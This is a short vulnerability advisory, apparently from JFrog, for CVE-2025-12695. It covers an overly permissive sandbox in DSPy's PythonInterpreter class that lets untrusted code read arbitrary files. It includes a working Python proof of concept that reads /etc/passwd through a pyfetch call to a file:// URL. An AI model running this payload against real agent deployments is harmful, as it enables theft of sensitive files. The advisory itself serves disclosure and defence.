---
description: CVE-2025-12695, MEDIUM, DSPy sandbox escape arbitrary file read
title: DSPy sandbox escape arbitrary file read
date_published: "2025-11-04"
last_updated: "2025-11-04"
xray_id: JFSA-2025-001495652
vul_id: CVE-2025-12695
cvss: 5.9
severity: medium
discovered_by: Natan Nehorai
type: vulnerability

---

## Summary

Insecure configuration in DSPy lead to arbitrary file read when running untrusted code inside the sandbox


## Component

dspy

## Affected versions

(,)

## Description

The overly permissive sandbox configuration in DSPy allows attackers to steal sensitive files in cases when users build an AI agent which consumes user input and uses the “PythonInterpreter” class.


## PoC

```python
import dspy
interpreter = dspy.PythonInterpreter()
expr = "from pyodide.http import pyfetch; response = await pyfetch(\"file:////etc/passwd\");data = await response.text(); print(data)"
answer = interpreter.execute(expr)
print(answer)

```

## Vulnerability Mitigations

No mitigations are supplied for this issue

## References



